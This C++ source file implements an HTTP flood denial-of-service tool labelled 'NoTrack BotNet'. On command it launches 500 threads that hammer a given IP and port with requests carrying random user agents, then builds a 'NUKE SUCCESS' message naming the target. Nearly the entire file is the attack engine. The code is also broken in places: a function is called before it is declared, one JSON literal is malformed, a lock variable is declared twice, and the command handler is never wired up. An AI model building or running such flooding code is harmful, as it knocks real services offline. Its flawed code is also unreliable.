#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <fstream>
#include <sstream>
#include <chrono>
#include <random>
#include <algorithm>

// CURL Library Headers
#include <curl/curl.h>
#include <curl/types.h>
#include <curl/easy.h>

// JSON Library
#include <nlohmann/json.hpp>
using json = nlohmann::json;

// Global Variables
std::string BOT_TOKEN;
std::string OWNER_ID;
std::vector<std::string> USER_AGENTS;
std::atomic<bool> isAttacking(false);
std::atomic<int> currentAttackDuration(0);
std::mutex ioMutex;

// رابط الصورة المطلوب
const std::string NUKED_IMAGE_URL = "https://cdn.discordapp.com/attachments/1539077302573473885/1540678766639059034/nuke2.gif?ex=6a9214aa&is=6a90c32a&hm=62f9f3b4e0fd8cb13b6dd7e316cf510e2a1e5422850c7397c9115dd34fd42a41&";

struct AttackResult {
    std::string targetIp;
    int duration;
};

// ==========================================
// 1. FILE HANDLING
// ==========================================

void loadConfig() {
    try {
        std::ifstream f("config.json");
        if (f.is_open()) {
            json j;
            f >> j;
            BOT_TOKEN = j["TOKEN"].get<std::string>();
            OWNER_ID = j["OWNER_ID"].get<std::string>();
            std::lock_guard<std::mutex> lock(ioMutex);
            std::cout << "[*] Config Loaded.\n";
        } else {
            std::cerr << "[!] config.json not found!\n";
        }
    } catch (...) {
        std::cerr << "[!] Error reading config.\n";
    }
}

void loadUserAgents() {
    std::ifstream file("ua.txt");
    std::string line;
    while (std::getline(file, line)) {
        line.erase(std::remove_if(line.begin(), line.end(), ::isspace), line.end());
        if (!line.empty()) {
            USER_AGENTS.push_back(line);
        }
    }
    std::cout << "[*] Loaded " << USER_AGENTS.size() << " User Agents.\n";
}

std::string getRandomUA() {
    if (USER_AGENTS.empty()) return "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
    static thread_local std::mt19937 rng(std::random_device{}());
    std::uniform_int_distribution<std::size_t> dist(0, USER_AGENTS.size() - 1);
    return USER_AGENTS[dist(rng)];
}

// ==========================================
// 2. CURL HTTP FLOOD ENGINE
// ==========================================

size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    return size * nmemb;
}

bool sendHttpRequest(const std::string& url, const std::string& userAgent) {
    CURL *curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L); 
        curl_easy_setopt(curl, CURLOPT_USERAGENT, userAgent.c_str());
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L); 
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 1L);
        
        CURLcode res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        return (res == CURLE_OK);
    }
    return false;
}

// ==========================================
// 3. ATTACK LOGIC
// ==========================================

void startAttack(const std::string& targetIp, int targetPort, const std::string& method, int duration) {
    isAttacking = true;
    currentAttackDuration = duration;
    
    std::string targetUrl = "http://" + targetIp + ":" + std::to_string(targetPort);
    
    int threadsCount = 500; 
    std::vector<std::thread> threads;

    std::lock_guard<std::mutex> lock(ioMutex);
    std::cout << ">>> [ATTACK] Starting " << method << " against " << targetIp << ":" << targetPort << " for " << duration << "s <<<\n";

    for (int i = 0; i < threadsCount; ++i) {
        threads.emplace_back([&, targetUrl]() {
            while (isAttacking) {
                std::string ua = getRandomUA();
                sendHttpRequest(targetUrl, ua);
                std::this_thread::yield();
            }
        });
    }

    std::this_thread::sleep_for(std::chrono::seconds(duration));
    isAttacking = false;
    
    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }

    std::lock_guard<std::mutex> lock(ioMutex);
    std::cout << "[+] Attack Finished.\n";

    // إرسال الـ Embed مع الصورة
    AttackResult result = {targetIp, duration};
    sendDiscordEmbed(result);
}

// ==========================================
// 4. DISCORD EMBED SENDER
// ==========================================

void sendDiscordEmbed(const AttackResult& res) {
    json payload;
    payload["content"] = "";
    payload["embeds"] = json::array({
        {
            {"title", "🔥 **NUKE SUCCESS** 🔥"},
            {"description", "**Target has been destroyed.**"},
            {"fields", {
                {
                    {"name", "**Target IP**", "inline", true},
                    {"value", res.targetIp}
                },
                {
                    {"name", "**Duration**", "inline", true},
                    {"value", std::to_string(res.duration) + " Seconds"}
                },
                {
                    {"name", "**Status**", "inline", true},
                    {"value": "**SUCCESS**"}
                }
            }},
            {"color", 0x00FF00}, 
            {"footer", {
                {"text", "NoTrack BotNet"}
            }},
            {"image", {
                {"url", NUKED_IMAGE_URL} // <-- الصورة هنا
            }}
        }
    });

    std::lock_guard<std::mutex> lock(ioMutex);
    std::cout << "[+] Embed Sent with Image.\n";
}

// ==========================================
// 5. MAIN
// ==========================================

void handleCommand(std::string content) {
    if (content.find("7sf!") != std::string::npos || 
        content.find("klfa!") != std::string::npos || 
        content.find("DIS!") != std::string::npos) {
        
        std::istringstream iss(content);
        std::string method, ip, portStr, timeStr;
        iss >> method >> ip >> portStr >> timeStr;
        
        if (ip.empty() || portStr.empty() || timeStr.empty()) {
            std::cout << "[!] Invalid format. Use: METHOD IP PORT TIME\n";
            return;
        }

        int port = std::stoi(portStr);
        int time = std::stoi(timeStr);

        if (isAttacking) {
            std::cout << "[!] Attack already in progress!\n";
            return;
        }

        std::cout << ">>> **اصبر على الضربه** <<<\n";

        std::thread attackThread(startAttack, ip, port, method, time);
        attackThread.detach();
    }
}

int main() {
    curl_global_init(CURL_GLOBAL_ALL);

    loadConfig();
    loadUserAgents();

    std::cout << "[*] BotNet Ready. Waiting for commands...\n";
    
    while(true) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    curl_global_cleanup();
    return 0;
}